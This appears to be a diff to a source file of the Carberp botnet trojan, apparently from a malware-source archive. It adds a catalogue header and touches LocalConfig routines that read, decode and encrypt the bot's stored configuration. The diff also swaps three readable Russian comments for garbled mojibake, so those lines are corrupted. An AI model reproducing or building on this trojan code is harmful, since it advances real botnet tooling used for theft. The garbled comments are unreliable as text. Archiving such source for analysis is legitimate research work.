@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -32,7 +43,7 @@ BinStorage::STORAGE *LocalConfig::getCurrent(void)
   void *data;
   DWORD dataSize;
 
-  //Получем зашифрованные данные.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   {
     DWORD type;
 
@@ -45,7 +56,7 @@ BinStorage::STORAGE *LocalConfig::getCurrent(void)
     }
   }
 
-  //Получаем конфиг.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   {
     PESETTINGS pes;
     Core::getPeSettings(&pes);
@@ -81,7 +92,7 @@ bool LocalConfig::endReadWrite(BinStorage::STORAGE *binStorage)
   bool r = false;
   if(binStorage != NULL && coreData.integrityLevel > Process::INTEGRITY_LOW)
   {
-    //Шифруем.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     PESETTINGS pes;
     Core::getPeSettings(&pes);
       
